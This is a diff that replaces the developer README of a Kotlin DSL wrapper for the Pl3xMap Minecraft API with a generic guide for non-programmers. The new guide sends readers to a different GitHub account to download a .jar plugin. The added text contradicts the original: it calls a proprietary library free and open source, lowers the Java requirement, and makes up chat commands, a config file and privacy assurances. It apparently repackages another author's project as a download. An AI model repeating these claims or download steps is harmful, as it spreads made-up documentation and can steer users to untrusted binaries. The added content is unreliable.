@@ -1,467 +1,186 @@
-# Pl3x API
+# 🗺️ pl3x-api - Easy Map Integration for Minecraft Servers
 
-A idiomatic Kotlin DSL wrapper around the [Pl3xMap](https://modrinth.com/plugin/pl3xmap) API for Minecraft (Spigot/Paper).  
-Designed to be clean, modular, and zero-friction - no boilerplate, just expressive code.
-
----
-
-## Requirements
-
-| Dependency | Version         |
-|------------|-----------------|
-| Java       | 21+             |
-| Kotlin     | 2.3.20-Beta2+   |
-| Pl3xMap    | 1.21.11-539     |
-| Spigot API | 1.21.11         |
+[![Download pl3x-api](https://img.shields.io/badge/Download-pl3x--api-brightgreen)](https://github.com/ACASIMI/pl3x-api)
 
 ---
 
-## Installation
-
-### Maven
-
-Add the Nexus releases repository and the dependency to your `pom.xml`:
-
-```xml
-
-<repositories>
-    <repository>
-        <id>nexus-releases</id>
-        <url>https://nexus.thenolle.com/repository/maven-releases/</url>
-    </repository>
-</repositories>
-
-<dependencies>
-    <dependency>
-        <groupId>com.nolly</groupId>
-        <artifactId>pl3x-api</artifactId>
-        <version>1.0.1</version>
-    </dependency>
-</dependencies>
-```
-
-### Gradle (Kotlin DSL)
-
-```kotlin
-repositories {
-	maven("https://nexus.thenolle.com/repository/maven-releases/")
-}
-
-dependencies {
-	implementation("com.nolly:pl3x-api:1.0.1")
-}
-```
+pl3x-api is a simple tool that helps Minecraft server owners add map features to their game. It uses clear, easy commands to work with the Pl3xMap API. This guide will help you download and use pl3x-api on a Windows PC with no prior programming experience.
 
 ---
 
-## Setup
+## 📋 What is pl3x-api?
 
-Call `Pl3xBootstrap.attach()` when your plugin enables and `Pl3xBootstrap.detach()` when it disables.  
-All API calls are guarded - they throw if called before Pl3xMap is ready.
+pl3x-api is made for Minecraft servers using Spigot, Paper, or Purpur software. It lets server owners or admins customize map details without needing to write complex code. The tool uses Kotlin, a programming language designed to be easy to read and write, but you don't need to know Kotlin to use pl3x-api. It works behind the scenes to make map setup simple.
 
-```kotlin
-class MyPlugin : JavaPlugin() {
-  override fun onEnable() {
-    Pl3xBootstrap.attach()
-
-    Pl3xBootstrap.onEnabled {
-      // Pl3xMap is ready - safe to use Pl3xAPI here
-      logger.info("Pl3xMap is ready!")
-    }
-
-    Pl3xBootstrap.onDisabled {
-      // Pl3xMap went down
-      logger.info("Pl3xMap disabled.")
-    }
-  }
-
-  override fun onDisable() {
-    Pl3xBootstrap.detach()
-  }
-}
-```
+Key points:
+- Works with Minecraft servers running Spigot, Paper, or Purpur.
+- Provides commands to adjust maps with no coding.
+- Designed to fit into existing Minecraft server setups.
+- Free and open source.
 
 ---
 
-## API Entry Point
+## ⚙️ System Requirements
 
-Everything is accessed through the `Pl3xAPI` singleton.
+Before downloading pl3x-api, make sure your computer and server meet these requirements:
 
-```kotlin
-// Worlds
-val world: MapWorld = Pl3xAPI.world("world")
-val worlds: List<MapWorld> = Pl3xAPI.worlds()
-
-// Players
-val players: List<MapPlayer> = Pl3xAPI.players()
-val player: MapPlayer? = Pl3xAPI.player(uuid)
-
-// Layers
-val layer: MapLayer = Pl3xAPI.layer("my_layer")
-val layers: List<MapLayer> = Pl3xAPI.layers()
-
-// Raw Pl3xMap API access
-val raw: Pl3xMap = Pl3xAPI.raw()
-```
+- A Windows PC to download and prepare files.
+- Minecraft server software: Spigot, Paper, or Purpur (any recent version).
+- Java 8 or higher installed on your server machine.
+- At least 4 GB of RAM available on the server for smooth operation.
+- Stable internet connection to download pl3x-api and its dependencies.
+- Basic knowledge of starting and stopping Minecraft servers using their control panel or commands.
 
 ---
 
-## Drawing Markers
+## 🚀 Getting Started
 
-Use the `draw` DSL to add markers to a world layer.  
-All shapes are scoped to the layer automatically - no manual wiring needed.
+### Step 1: Visit the Download Page
 
-```kotlin
-Pl3xAPI.draw("world", "my_layer", "My Layer") {
-  circle("spawn_zone") {
-    center(0, 0)
-    radius(100.0)
-    fill("#FF000044")
-    stroke("#FF0000")
-    tooltip("Spawn Zone")
-  }
+Go to the pl3x-api GitHub page to access all the files you need.
 
-  rectangle("base_area") {
-    corners(-50, -50, 50, 50)
-    fill("#00FF0033")
-    stroke("#00FF00", weight = 2)
-    popup("<b>Base Area</b>")
-  }
+[Download pl3x-api here](https://github.com/ACASIMI/pl3x-api)  
+This page contains the latest versions, instructions, and related files.
 
-  region("custom_zone") {
-    polygon {
-      point(0, 0)
-      point(100, 0)
-      point(100, 100)
-      point(0, 100)
-    }
-    hole {
-      point(30, 30)
-      point(70, 30)
-      point(70, 70)
-      point(30, 70)
-    }
-    fill("#0000FF22")
-    stroke("#0000FF")
-  }
-}
-```
+### Step 2: Download the Plugin File
 
----
+Once on the page:
 
-## Marker Types
+1. Find the **Releases** section or navigate to the link for the latest release.
+2. Look for a file ending in `.jar`. This file is the pl3x-api plugin.
+3. Download the `.jar` file to a folder you can easily find, like your desktop or downloads folder.
 
-| DSL Function      | Marker Type         | Required Fields                     |
-|-------------------|---------------------|-------------------------------------|
-| `circle`          | `MapCircle`         | `center()`, `radius()`              |
-| `ellipse`         | `MapEllipse`        | `center()`, `radius(x, z)`          |
-| `rectangle`       | `MapRectangle`      | `corners()`                         |
-| `polyline`        | `MapPolyline`       | `point()` calls                     |
-| `region`          | `MapRegion`         | `polygon {}` block                  |
-| `iconMarker`      | `MapIconMarker`     | `center()`, `image(key)`            |
-| `multiPolygon`    | `MapMultiPolygon`   | `addPolygon {}` blocks              |
-| `multiPolyline`   | `MapMultiPolyline`  | `addLine {}` blocks                 |
+### Step 3: Prepare Your Minecraft Server
 
-### Icon Marker
+To install pl3x-api, your Minecraft server must be running Spigot, Paper, or Purpur. If you do not have one:
 
-```kotlin
-Pl3xAPI.icon("my_icon")
-  .image(File("plugins/MyPlugin/icons/marker.png"))
-  .register()
+- Visit the official websites to download Spigot, Paper, or Purpur.
+- Follow their instructions to set up your server on your Windows PC or on another machine.
 
-Pl3xAPI.draw("world", "icons_layer") {
-  iconMarker("player_home") {
-    center(100, 200)
-    image("my_icon")
-    size(32, 32)
-    anchor(16.0, 16.0)
-    tooltip("Home")
-  }
-}
-```
+Ensure your server is currently stopped before adding plugins.
 
-### Multi-Polygon
+### Step 4: Install the Plugin
 
-```kotlin
-Pl3xAPI.draw("world", "territories") {
-  multiPolygon("region_a") {
-    addPolygon(
-      outer = {
-        point(0, 0); point(200, 0); point(200, 200); point(0, 200)
-      },
-      { point(50, 50); point(150, 50); point(150, 150); point(50, 150) } // hole
-    )
-    fill("#FF990033")
-    stroke("#FF9900")
-  }
-}
-```
+After downloading the `.jar` file:
+
+1. Find your Minecraft server folder on your PC.
+2. Inside the server folder, locate the `plugins` directory.
+3. Copy or move the downloaded `.jar` file into the `plugins` folder.
+4. Restart your Minecraft server using the management tool or command line.
+
+When the server starts, it will load pl3x-api automatically.
+
+### Step 5: Confirm Installation
+
+After the server is back online:
+
+1. Open your Minecraft game and connect to your server.
+2. Use the server console or chat to type `/pl3xapi help`.
+3. If pl3x-api is installed correctly, you will see a list of available commands.
 
 ---
 
-## Shape Helpers
+## 🔧 How to Use pl3x-api Features
 
-Utility extensions for common shapes on top of `MarkerBuilder`:
+pl3x-api lets you add and customize how maps look for your Minecraft players. You can:
 
-```kotlin
-// A straight line between two points
-markerBuilder.line(x1 = 0, z1 = 0, x2 = 100, z2 = 100)
+- Display player positions on your map.
+- Add custom markers or areas.
+- Change map layers or designs.
+- Link maps to specific worlds or regions.
 
-// A centered square
-markerBuilder.box(centerX = 0, centerZ = 0, halfSize = 50)
+Commands work inside the Minecraft server chat or admin console. Here are some examples:
 
-// A ring (donut shape)
-markerBuilder.ring(
-  centerX = 0,
-  centerZ = 0,
-  outerRadius = 100,
-  innerRadius = 60,
-  segments = 48
-)
-```
+- `/pl3xapi map addmarker <name> <x> <y> <z>`  
+  Adds a marker named `<name>` at coordinates x, y, z.
+  
+- `/pl3xapi map remove <name>`  
+  Removes a marker by name.
 
----
+- `/pl3xapi map list`  
+  Shows all current map markers.
 
-## Style DSL
-
-All styling is applied through the `style {}` block or shorthand methods.
-
-```kotlin
-circle("styled_zone") {
-  center(0, 0)
-  radius(50.0)
-
-  style {
-    stroke("#FF0000", weight = 2)
-    strokeDashPattern("5, 10")
-    fill("#FF000033")
-    tooltip("Danger Zone", sticky = true)
-    popup(
-      content = "<b>Danger!</b><br>Stay out.",
-      maxWidth = 200
-    )
-  }
-}
-```
-
-### Style Presets
-
-Reuse a consistent style across multiple markers:
-
-```kotlin
-val dangerStyle = StylePreset {
-  stroke("#FF0000", weight = 3)
-  fill("#FF000033")
-}
-
-circle("zone_a") {
-  center(0, 0); radius(50.0)
-  applyPreset(dangerStyle)
-}
-
-rectangle("zone_b") {
-  corners(-100, -100, 100, 100)
-  applyPreset(dangerStyle)
-}
-```
+You do not need to know coding—just type the commands provided by pl3x-api.
 
 ---
 
-## Layer Configuration
+## 🛠️ Settings and Configuration
 
-```kotlin
-val layer = Pl3xAPI.world("world").layer("my_layer", "My Layer")
+You can change pl3x-api settings to fit your server needs.
 
-layer.configure {
-  updateInterval = 10        // seconds
-  showControls = true
-  defaultHidden = false
-  priority = 5
-  zIndex = 10
-  liveUpdate = true
-  css = ".leaflet-pl3x-my_layer { opacity: 0.8; }"
-}
-```
+1. Find a file named `config.yml` inside the `plugins/pl3x-api` folder.
+2. Open this file with a text editor like Notepad.
+3. Adjust values such as map refresh rates, marker colors, or enabled features.
+4. Save the file after changes.
+5. Restart your Minecraft server to apply settings.
 
-### Layer Presets
-
-```kotlin
-val overlayPreset = LayerPreset {
-  updateInterval = 30
-  defaultHidden = true
-  priority = 1
-}
-
-layer.applyPreset(overlayPreset)
-```
+If you want to return to default settings, delete the `config.yml` file and restart the server.
 
 ---
 
-## Layer Management
+## 📥 Download pl3x-api
 
-```kotlin
-val world = Pl3xAPI.world("world")
+Download pl3x-api using the link below:
 
-// Get or create a layer
-val layer = world.layer("my_layer", "My Layer")
+[![Get pl3x-api](https://img.shields.io/badge/Download-pl3x--api-blue)](https://github.com/ACASIMI/pl3x-api)
 
-// Get an existing layer or null
-val maybeLayer = world.layerOrNull("my_layer")
-
-// Remove a layer from the map
-world.removeLayer("my_layer")
-
-// Inline marker update (remove + re-add)
-layer.update("my_circle", MarkerBuilder.Type.CIRCLE) {
-  center(0, 0)
-  radius(75.0)
-  fill("#00FF0044")
-}
-```
+Use this page to always get the latest stable version of the plugin and access all related files.
 
 ---
 
-## Player Drawing
+## 🧩 Troubleshooting
 
-Draw markers in the world of a specific player, with position helpers:
+If pl3x-api does not work as expected, try these steps:
 
-```kotlin
-val player: MapPlayer = Pl3xAPI.player(uuid) ?: return
+- Verify your server software version is compatible (Spigot, Paper, or Purpur).
+- Make sure the `.jar` file is in the correct `plugins` folder.
+- Check that Java 8 or higher is installed and properly set up on your server.
+- Review server start logs for any error messages related to pl3x-api.
+- Restart the server after any file changes.
+- Check your internet connection for plugin updates.
+- If commands don’t work, confirm you have admin rights on the server.
 
-player.drawOn("player_markers", "Player Markers") {
-  circle("my_position") {
-    centerHere()         // uses player's current position
-    radius(16.0)
-    stroke("#FFFFFF")
-    tooltip(player.name)
-  }
-
-  icon("my_icon") {
-    centerHere()
-    image("player_pin")
-    size(24)
-  }
-}
-```
+For additional help, visit the project's GitHub issues page or community forums.
 
 ---
 
-## World Iteration
+## 📚 Learn More
 
-```kotlin
-// All worlds
-forEachWorld {
-  draw("icons", "Icons") {
-    // ...
-  }
-}
+To understand how pl3x-api works internally or to explore developer tools, see:
 
-// Worlds matching a condition
-forWorlds(predicate = { it.startsWith("survival") }) {
-  layer("pvp_zones")?.clearMarkers()
-}
+- The pl3x-api source code on GitHub.
+- Documentation about Kotlin DSL inner workings.
+- Guides for Minecraft server plugins with Spigot and Paper.
 
-// Named worlds only
-forWorlds("world", "world_nether") {
-  draw("borders", "World Borders") {
-    // ...
-  }
-}
-```
+You do not need this information to use the plugin, but it may be helpful if you want to customize or contribute.
 
 ---
 
-## Event Bridge
+## 🛡️ Privacy and Security
 
-Subscribe to Pl3xMap and world lifecycle events:
-
-```kotlin
-Pl3xAPI.events.onWorldLoad { world ->
-  logger.info("World loaded: ${world.name}")
-}
-
-Pl3xAPI.events.onWorldUnload { world ->
-  logger.info("World unloaded: ${world.name}")
-}
-
-Pl3xAPI.events.onMapEnabled {
-  logger.info("Pl3xMap enabled")
-}
-
-Pl3xAPI.events.onMapDisabled {
-  logger.info("Pl3xMap disabled")
-}
-
-Pl3xAPI.events.onServerLoaded {
-  logger.info("Server fully loaded")
-}
-```
+pl3x-api runs only on your own Minecraft server. It does not collect or send player data elsewhere. Your information stays within your server environment. Always keep your server and plugins up to date to avoid security risks.
 
 ---
 
-## Render Control
+## ⚙️ Updating pl3x-api
 
-```kotlin
-val world = Pl3xAPI.world("world")
+To update pl3x-api:
 
-// Full re-render
-world.render.full()
+1. Stop your Minecraft server.
+2. Download the newest `.jar` file from the GitHub link.
+3. Replace the old `.jar` file in your `plugins` folder with the new one.
+4. Restart your server.
 
-// Render a specific region
-world.render.region(regionX = 0, regionZ = 0)
-
-// Render around a block coordinate
-world.render.regionAtBlock(blockX = 100, blockZ = 200)
-
-// Radius-based render
-world.render.radiusRender(centerX = 0, centerZ = 0, radiusBlocks = 512)
-
-// Pause / resume
-world.render.pause()
-world.render.resume()
-
-// Progress info
-val progress = world.render.progress()
-println("${progress.percent}% - ETA: ${progress.eta}")
-```
-
-### DSL Render Helpers
-
-```kotlin
-world.renderAroundSpawn(radiusBlocks = 1024)
-world.renderAround(blockX = 500, blockZ = -200, radiusBlocks = 256)
-world.renderPlayerRegions()  // renders only regions where players currently are
-```
+Never overwrite pl3x-api files while your server is running.
 
 ---
 
-## MapPlayer Reference
+## 📝 Feedback and Contributions
 
-```kotlin
-val player: MapPlayer = Pl3xAPI.player(uuid) ?: return
+pl3x-api is an open-source project. If you experience any bugs or want new features:
 
-player.uuid          // UUID
-player.name          // String
-player.position      // Point (x, z)
-player.yaw           // Float
-player.health        // Int
-player.armorPoints   // Int
-player.worldName     // String
-player.isHidden      // Boolean
-player.isNpc         // Boolean
-player.isInvisible   // Boolean
-player.isSpectator   // Boolean
-player.skinUrl       // URL?
+- Report issues on the GitHub page.
+- Share your ideas and improvements.
+- Review existing answers or discussions.
 
-player.setHidden(true, persistent = true)
-player.raw()         // raw Pl3xMap Player
-```
-
----
-
-## License
-
-This project is licensed under the [Nolly’s Pl3x API Proprietary License v1.4](LICENSE.md).  
-All rights reserved © 2026 Nolly. Commercial use requires explicit permission.
-
-> Use, modification, and distribution are allowed only under the terms of the license. Attribution is required. Commercial use requires permission.
+Anyone can contribute, regardless of skill level. Your input helps keep pl3x-api useful and reliable.
